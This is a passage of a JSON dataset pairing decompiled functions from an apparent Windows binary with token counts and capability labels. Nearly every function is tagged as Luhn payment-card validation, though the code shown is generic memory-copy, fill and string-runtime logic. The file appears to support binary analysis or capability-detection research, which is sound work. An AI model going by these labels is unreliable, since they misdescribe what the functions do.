        "decompiled_code": "\nvoid __fastcall fcn.00401548(int32_t param_1, int32_t param_2)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    param_1 = param_1 + -0xc;\n    iVar2 = in_EAX + param_1;\n    param_2 = param_2 + param_1;\n    iVar3 = -param_1;\n    if (0 < param_1) {\n        do {\n            iVar1 = *(iVar3 + iVar2);\n            *(iVar3 + 8 + param_2) = ROUND(*(iVar3 + 8 + iVar2));\n            *(iVar3 + param_2) = ROUND(iVar1);\n            iVar3 = iVar3 + 0x10;\n        } while (iVar3 < 0);\n    }\n    *(iVar3 + param_2) = ROUND(*(iVar3 + iVar2));\n    *(iVar3 + 8 + param_2) = *(iVar3 + 8 + iVar2);\n    return;\n}\n",
        "token_count": 234
    },
    "004022b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004022b4(int32_t param_1, int32_t param_2)\n\n{\n    fcn.00402ee0();\n    return param_2 + param_1;\n}\n",
        "token_count": 48
    },
    "00402384": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00402384(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t *in_EAX;\n    uint var_10h;\n    \n    uVar1 = *in_EAX;\n    if ((0xffff < uVar1) && (cVar2 = fcn.004022cc(&stack0xfffffffc),  cVar2 != '\\0')) {\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 105
    },
    "00402be8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402be8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *0x493708;\n    while (iVar1 != 0x493704) {\n        iVar1 = *(iVar1 + 4);\n        sub.kernel32.dll_VirtualFree();\n    }\n    iVar2 = 0x37;\n    iVar1 = 0x490040;\n    do {\n        *(iVar1 + 0x14) = iVar1;\n        *(iVar1 + 4) = iVar1;\n        *(iVar1 + 8) = 1;\n        *(iVar1 + 0xc) = 0;\n        iVar1 = iVar1 + 0x20;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    *0x493704 = 0x493704;\n    *0x493708 = 0x493704;\n    iVar2 = 0x400;\n    iVar1 = 0x4937a4;\n    do {\n        *iVar1 = iVar1;\n        *(iVar1 + 4) = iVar1;\n        iVar1 = iVar1 + 8;\n        iVar2 = iVar2 + -1;\n        iVar3 = *0x4957ac;\n    } while (iVar2 != 0);\n    while (iVar3 != 0x4957a8) {\n        iVar3 = *(iVar3 + 4);\n        sub.kernel32.dll_VirtualFree();\n    }\n    *0x4957a8 = 0x4957a8;\n    *0x4957ac = 0x4957a8;\n    return;\n}\n",
        "token_count": 369
    },
    "00402e7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402e7c(int32_t param_1, int32_t param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    \n    uVar1 = *in_EAX;\n    if (uVar1 == 0) {\n        *param_3 = 0;\n        return;\n    }\n    if (param_2 < 1) {\n        param_2 = 1;\ncode_r0x00402e92:\n        iVar2 = (uVar1 - param_2) + 1;\n        if (-1 < param_1) {\n            if (iVar2 < param_1) {\n                param_1 = iVar2;\n            }\n            goto code_r0x00402e9d;\n        }\n    }\n    else if (param_2 <= uVar1) goto code_r0x00402e92;\n    param_1 = 0;\ncode_r0x00402e9d:\n    *param_3 = param_1;\n    puVar3 = in_EAX + param_2;\n    for (; param_3 = param_3 + 1,  param_1 != 0; param_1 = param_1 + -1) {\n        *param_3 = *puVar3;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 322
    },
    "00402ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __fastcall fcn.00402ee0(uint32_t param_1, int64_t *param_2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar uVar5;\n    ushort uVar6;\n    uint uVar7;\n    int64_t *in_EAX;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int64_t *piVar11;\n    bool bVar12;\n    \n    if (in_EAX != param_2) {\n        if (0x20 < param_1) {\n            if (0x20 < param_1) {\n                if ((param_2 < in_EAX) ||\n                   (piVar11 = param_2 - param_1,  param_2 = param_1 + piVar11,  in_EAX <= piVar11)) {\n                    iVar2 = *in_EAX;\n                    piVar11 = (param_1 - 8) + in_EAX;\n                    piVar1 = param_2 + (param_1 - 8);\n                    iVar3 = *piVar11;\n                    iVar8 = ((param_2 & 0xfffffff8) + 8) - piVar1;\n                    do {\n                        *(iVar8 + piVar1) = ROUND(*(iVar8 + piVar11));\n                        bVar12 = SCARRY4(iVar8, 8);\n                        iVar8 = iVar8 + 8;\n                    } while (bVar12 != iVar8 < 0);\n                    *piVar1 = ROUND(iVar3);\n                    *param_2 = ROUND(iVar2);\n                    return;\n                }\n                iVar9 = param_1 - 8;\n                iVar2 = *(iVar9 + in_EAX);\n                iVar3 = *in_EAX;\n                iVar8 = (iVar9 + param_2 & 0xfffffff8U) - param_2;\n                do {\n                    *(iVar8 + param_2) = ROUND(*(iVar8 + in_EAX));\n                    iVar10 = iVar8 + -8;\n                    bVar12 = 7 < iVar8;\n                    iVar8 = iVar10;\n                } while (iVar10 != 0 && bVar12);\n                *param_2 = ROUND(iVar3);\n                *(iVar9 + param_2) = ROUND(iVar2);\n            }\n            return;\n        }\n        iVar8 = param_1 - 8;\n        if (iVar8 == 0 || param_1 < 8) {\n            switch(param_1) {\n            case 0:\n                goto code_r0x00402f15;\n            case 1:\n                *param_2 = *in_EAX;\n                return;\n            case 2:\n                *param_2 = *in_EAX;\n                return;\n            case 3:\n                uVar5 = *(in_EAX + 2);\n                *param_2 = *in_EAX;\n                *(param_2 + 2) = uVar5;\n                return;\n            case 4:\n                *param_2 = *in_EAX;\n                return;\n            case 5:\n                uVar5 = *(in_EAX + 4);\n                *param_2 = *in_EAX;\n                *(param_2 + 4) = uVar5;\n                return;\n            case 6:\n                uVar6 = *(in_EAX + 4);\n                *param_2 = *in_EAX;\n                *(param_2 + 4) = uVar6;\n                return;\n            case 7:\n                uVar7 = *(in_EAX + 3);\n                *param_2 = *in_EAX;\n                *(param_2 + 3) = uVar7;\n                return;\n            case 8:\n                *param_2 = ROUND(*in_EAX);\n                return;\n            case 9:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xb:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xc:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xd:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xe:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            default:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x11:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x12:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x13:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x14:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x15:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x16:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x17:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x19:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1a:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1c:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1d:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1e:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1f:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x20:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        iVar2 = *(iVar8 + in_EAX);\n        iVar3 = *in_EAX;\n        if (8 < iVar8) {\n            iVar4 = in_EAX[1];\n            if (0x10 < iVar8) {\n                param_2[2] = ROUND(in_EAX[2]);\n            }\n            param_2[1] = ROUND(iVar4);\n        }\n        *param_2 = ROUND(iVar3);\n        *(iVar8 + param_2) = ROUND(iVar2);\n    }\ncode_r0x00402f15:\n    return;\n}\n",
        "token_count": 1539
    },
    "00403720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403720(uchar param_1, int32_t param_2)\n\n{\n    ulong uVar1;\n    ulong *in_EAX;\n    ushort uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    uVar2 = CONCAT11(param_1, param_1);\n    if (0x1f < param_2) {\n        *in_EAX = uVar2;\n        *(in_EAX + 2) = uVar2;\n        *(in_EAX + 4) = uVar2;\n        *(in_EAX + 6) = uVar2;\n        uVar1 = *in_EAX;\n        *(param_2 + -0x10 + in_EAX) = uVar1;\n        *(param_2 + -8 + in_EAX) = uVar1;\n        iVar3 = (in_EAX & 7) - 8;\n        iVar4 = param_2 + -0x10 + iVar3;\n        iVar3 = iVar4 - iVar3;\n        iVar4 = -iVar4;\n        do {\n            *(in_EAX + iVar4 + iVar3) = uVar1;\n            *(in_EAX + iVar4 + 8 + iVar3) = uVar1;\n            bVar5 = SCARRY4(iVar4, 0x10);\n            iVar4 = iVar4 + 0x10;\n        } while (bVar5 != iVar4 < 0);\n        return;\n    }\n    *(param_2 + -1 + in_EAX) = param_1;\n    switch(param_2) {\n    default:\n        return;\n    case 0x1e:\n    case 0x1f:\n        *(in_EAX + 0x1c) = uVar2;\n    case 0x1c:\n    case 0x1d:\n        *(in_EAX + 0x1a) = uVar2;\n    case 0x1a:\n    case 0x1b:\n        *(in_EAX + 3) = uVar2;\n    case 0x18:\n    case 0x19:\n        *(in_EAX + 0x16) = uVar2;\n    case 0x16:\n    case 0x17:\n        *(in_EAX + 0x14) = uVar2;\n    case 0x14:\n    case 0x15:\n        *(in_EAX + 0x12) = uVar2;\n    case 0x12:\n    case 0x13:\n        *(in_EAX + 2) = uVar2;\n    case 0x10:\n    case 0x11:\n        *(in_EAX + 0xe) = uVar2;\n    case 0xe:\n    case 0xf:\n        *(in_EAX + 0xc) = uVar2;\n    case 0xc:\n    case 0xd:\n        *(in_EAX + 10) = uVar2;\n    case 10:\n    case 0xb:\n        *(in_EAX + 1) = uVar2;\n    case 8:\n    case 9:\n        *(in_EAX + 6) = uVar2;\n    case 6:\n    case 7:\n        *(in_EAX + 4) = uVar2;\n    case 4:\n    case 5:\n        *(in_EAX + 2) = uVar2;\n    case 2:\n    case 3:\n        *in_EAX = uVar2;\n        return;\n    }\n}\n",
        "token_count": 780
    },
    "00403f28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403f28(uint param_1, char param_2)\n\n{\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00403fdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403fdc(int32_t **param_1, code *UNRECOVERED_JUMPTABLE)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if (UNRECOVERED_JUMPTABLE < 0xff000000) {\n        if (0xfdffffff < UNRECOVERED_JUMPTABLE) {\n    // WARNING: Could not recover jumptable at 0x00403ff3. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(UNRECOVERED_JUMPTABLE + *in_EAX))();\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x00403ff5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    ppiVar2 = *((UNRECOVERED_JUMPTABLE & 0xffffff) + in_EAX);\n    if (ppiVar2 == NULL) {\n        piVar1 = *param_1;\n        *param_1 = NULL;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        return;\n    }\n    (*(*ppiVar2)[1])(ppiVar2, param_1, ppiVar2);\n    piVar1 = *ppiVar2;\n    *ppiVar2 = param_1;\n    if (piVar1 == NULL) {\n        return;\n    }\n    (**(*piVar1 + 8))(piVar1);\n    return;\n}\n",
        "token_count": 360
    },
    "004040a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004040a0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    do {\n        piVar1 = *(in_EAX + -0x48);\n        if (piVar1 != NULL) {\n            iVar2 = *piVar1;\n            piVar1 = piVar1 + 1;\n            do {\n                if ((((*param_2 == *piVar1) && (param_2[1] == piVar1[1])) && (param_2[2] == piVar1[2])) &&\n                   (param_2[3] == piVar1[3])) {\n                    return piVar1;\n                }\n                piVar1 = piVar1 + 7;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return NULL;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 252
    },
    "00404124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404124(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint16_t unaff_SI;\n    uint16_t *puVar2;\n    bool bVar3;\n    \n    do {\n        puVar2 = *(in_EAX + -0x30);\n        if (puVar2 != NULL) {\n            uVar1 = *puVar2;\n            bVar3 = puVar2 + 1 == NULL;\n            puVar2 = puVar2 + 1;\n            do {\n                if (uVar1 == 0) break;\n                uVar1 = uVar1 - 1;\n                bVar3 = unaff_SI == *puVar2;\n                puVar2 = puVar2 + 1;\n            } while (!bVar3);\n            if (bVar3) {\n                return;\n            }\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 235
    },
    "00404198": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404198(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x3c);\n}\n",
        "token_count": 34
    },
    "004041dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004041dc(uint param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    \n    uVar1 = 0;\n    uVar5 = 0;\n    uVar3 = *param_2;\n    while( true ) {\n        puVar4 = *(in_EAX + -0x34);\n        if (puVar4 != NULL) {\n            uVar5 = uVar5 & 0xffff0000 | *puVar4;\n            puVar4 = puVar4 + 1;\n            do {\n                uVar2 = uVar1 & 0xffffff00;\n                if (*(puVar4 + 3) == uVar3) {\n                    uVar2 = uVar1 & 0xffff0000 | *(puVar4 + 3);\n                    while (((*(uVar2 + 6 + puVar4) ^ param_2[uVar2]) & 0xdf) == 0) {\n                        uVar2 = uVar2 - 1;\n                        if (uVar2 == 0) {\n                            return *(puVar4 + 1);\n                        }\n                    }\n                    uVar3 = *param_2;\n                }\n                uVar1 = uVar2 & 0xffff0000 | *puVar4;\n                puVar4 = puVar4 + uVar1;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) break;\n        in_EAX = **(in_EAX + -0x24);\n    }\n    return 0;\n}\n",
        "token_count": 400
    },
    "004042d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004042d4(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x404303;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + -0x1c))();\n    *in_FS_OFFSET = uStack32;\n    return in_EAX;\n}\n",
        "token_count": 132
    },
    "00404890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404890(int32_t *arg_8h)\n\n{\n    fcn.00402ddc();\n    return;\n}\n",
        "token_count": 33
    },
    "00404b24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404b24(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *in_EAX;\n    do {\n        fcn.00406a50();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 74
    },
    "00404b4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404b4c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    \n    iVar2 = *in_EAX;\n    ppiVar1 = in_EAX + 1;\n    do {\n        **ppiVar1 = *ppiVar1[1] + ppiVar1[2];\n        ppiVar1 = ppiVar1 + 3;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 123
    },
    "00404dc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404dc4(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    do {\n        iVar2 = *in_EAX;\n        if ((iVar2 != 0) && (*in_EAX = 0,  0 < *(iVar2 + -8))) {\n            LOCK();\n            piVar1 = iVar2 + -8;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                fcn.00402d00();\n            }\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 183
    },
    "00404e64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.00404e64(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (0 < in_EAX) {\n        puVar1 = fcn.00402ce4();\n        *(((in_EAX + 10U & 0xfffffffe) - 2) + puVar1) = 0;\n        puVar1[1] = in_EAX;\n        *puVar1 = 1;\n        return puVar1 + 2;\n    }\n    return NULL;\n}\n",
        "token_count": 118
    },
    "00404f98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404f98(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; (((*pcVar2 != '\\0' && (pcVar2[1] != '\\0')) && (pcVar2[2] != '\\0')) && (pcVar2[3] != '\\0'));\n            pcVar2 = pcVar2 + 4) {\n        }\n    }\n    uVar1 = fcn.00404e64();\n    if (param_2 != NULL) {\n        fcn.00402ee0();\n    }\n    fcn.00404da0();\n    *in_EAX = uVar1;\n    return;\n}\n",
        "token_count": 185
    },
    "00405010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405010(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_EAX;\n    char *pcVar3;\n    \n    pcVar3 = param_2;\n    do {\n        if (param_1 == 0) break;\n        param_1 = param_1 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = fcn.00404e64();\n    if (param_2 != NULL) {\n        fcn.00402ee0();\n    }\n    fcn.00404da0();\n    *in_EAX = uVar2;\n    return;\n}\n",
        "token_count": 177
    },
    "0040506c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040506c(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    if (param_2 == 0) {\n        return;\n    }\n    if (*in_EAX != 0) {\n        if (param_2 == *in_EAX) {\n            fcn.004054ec();\n        }\n        else {\n            fcn.004054ec();\n        }\n        fcn.00402ee0();\n        return;\n    }\n    if (param_2 != 0) {\n        iVar2 = *(param_2 + -8);\n        if (iVar2 == -1 || SCARRY4(iVar2, 1) != iVar2 + 1 < 0) {\n            param_2 = fcn.00404e64(param_2);\n            fcn.00402ee0();\n        }\n        else {\n            LOCK();\n            *(param_2 + -8) = *(param_2 + -8) + 1;\n        }\n    }\n    iVar2 = *in_EAX;\n    *in_EAX = param_2;\n    if ((iVar2 != 0) && (0 < *(iVar2 + -8))) {\n        LOCK();\n        piVar1 = iVar2 + -8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402d00();\n        }\n    }\n    return;\n}\n",
        "token_count": 335
    },
    "004050b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004050b0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_EAX;\n    \n    iVar3 = param_1;\n    if ((param_2 != 0) && (iVar3 = param_2,  param_1 != 0)) {\n        if (param_2 != *in_EAX) {\n            if (param_1 == *in_EAX) {\n                iVar3 = fcn.00404e64();\n                fcn.00402ee0();\n                fcn.00402ee0();\n                if (iVar3 != 0) {\n                    *(iVar3 + -8) = *(iVar3 + -8) + -1;\n                }\n                fcn.00404df4();\n                return;\n            }\n            fcn.00404df4();\n        }\n        if (param_1 == 0) {\n            return;\n        }\n        iVar3 = param_1;\n        if (*in_EAX != 0) {\n            if (param_1 == *in_EAX) {\n                fcn.004054ec();\n            }\n            else {\n                fcn.004054ec();\n            }\n            fcn.00402ee0();\n            return;\n        }\n    }\n    if (iVar3 != 0) {\n        iVar2 = *(iVar3 + -8);\n        if (iVar2 == -1 || SCARRY4(iVar2, 1) != iVar2 + 1 < 0) {\n            iVar3 = fcn.00404e64(iVar3);\n            fcn.00402ee0();\n        }\n        else {\n            LOCK();\n            *(iVar3 + -8) = *(iVar3 + -8) + 1;\n        }\n    }\n    iVar2 = *in_EAX;\n    *in_EAX = iVar3;\n    if ((iVar2 != 0) && (0 < *(iVar2 + -8))) {\n        LOCK();\n        piVar1 = iVar2 + -8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402d00();\n        }\n    }\n    return;\n}\n",
        "token_count": 497
    },
    "00405124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405124(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iStack24;\n    \n    piVar3 = NULL;\n    piVar1 = *(&stack0x00000000 + param_2 * 4);\n    iVar2 = param_2;\n    if ((piVar1 != NULL) && (*in_EAX == piVar1)) {\n        iVar2 = param_2 + -1;\n        piVar3 = piVar1;\n    }\n    do {\n        if ((*(&stack0x00000000 + iVar2 * 4) != NULL) && (piVar3 == *(&stack0x00000000 + iVar2 * 4))) {\n            piVar3 = NULL;\n        }\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    if (piVar3 == NULL) {\n        iStack24 = fcn.00404e64();\n    }\n    else {\n        fcn.004054ec();\n        iStack24 = *in_EAX;\n        param_2 = param_2 + -1;\n        piVar3 = in_EAX;\n    }\n    do {\n        if (*(&stack0x00000000 + param_2 * 4) != 0) {\n            fcn.00402ee0();\n        }\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    if (piVar3 == NULL) {\n        if (iStack24 != 0) {\n            *(iStack24 + -8) = *(iStack24 + -8) + -1;\n        }\n        fcn.00404df4();\n    }\n    // WARNING: Could not recover jumptable at 0x004051ab. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 463
    },
    "004052c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004052c4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((in_EAX == 0) || (*(in_EAX + -4) == 0)) || ((0 < param_2 && (*(in_EAX + -4) <= param_2 + -1)))) ||\n       (param_1 < 0)) {\n        fcn.00404da0();\n    }\n    else {\n        fcn.00404e90();\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00405304": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405304(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.004052b4();\n    if (*in_EAX != 0) {\n        if (((0 < param_2) && (param_2 + -1 < *(*in_EAX + -4))) && (0 < param_1)) {\n            fcn.00402ee0();\n            fcn.004054ec();\n        }\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "0040534c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040534c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.004054ec();\n        fcn.00402ee0();\n        fcn.00402ee0();\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "004053a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.004053a8(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    bool bVar8;\n    \n    if ((param_2 != 0) && (in_EAX != 0)) {\n        iVar5 = *(in_EAX + -4);\n        if ((iVar5 <= *(param_2 + -4)) && (0 < iVar5)) {\n            iVar5 = iVar5 + -1;\n            pcVar6 = *(param_2 + -4) + param_2;\n            pcVar4 = param_2 + iVar5;\n            pcVar2 = in_EAX + iVar5;\n            iVar5 = -iVar5;\n            cVar1 = *pcVar2;\n            if (iVar5 != 0) {\n                pcVar3 = pcVar4;\ncode_r0x00405480:\n                iVar7 = iVar5;\n                if (cVar1 == *pcVar3) goto code_r0x004054cf;\ncode_r0x00405484:\n                iVar7 = iVar5;\n                if (cVar1 == pcVar3[1]) goto code_r0x004054a2;\n                while (pcVar3 = pcVar3 + 2,  pcVar3 < pcVar6 + -2) {\n                    while( true ) {\n                        iVar7 = iVar5;\n                        if (cVar1 == *pcVar3) goto code_r0x004054cf;\n                        if (cVar1 == pcVar3[1]) goto code_r0x004054a2;\n                        if (cVar1 == pcVar3[2]) {\n                            pcVar3 = pcVar3 + 2;\n                            goto code_r0x004054cf;\n                        }\n                        if (cVar1 == pcVar3[3]) break;\n                        pcVar3 = pcVar3 + 4;\n                        if (pcVar6 + -2 <= pcVar3) {\n                            if (pcVar6 <= pcVar3) {\n                                return NULL;\n                            }\n                            goto code_r0x00405480;\n                        }\n                    }\n                    pcVar3 = pcVar3 + 2;\ncode_r0x004054a2:\n                    while 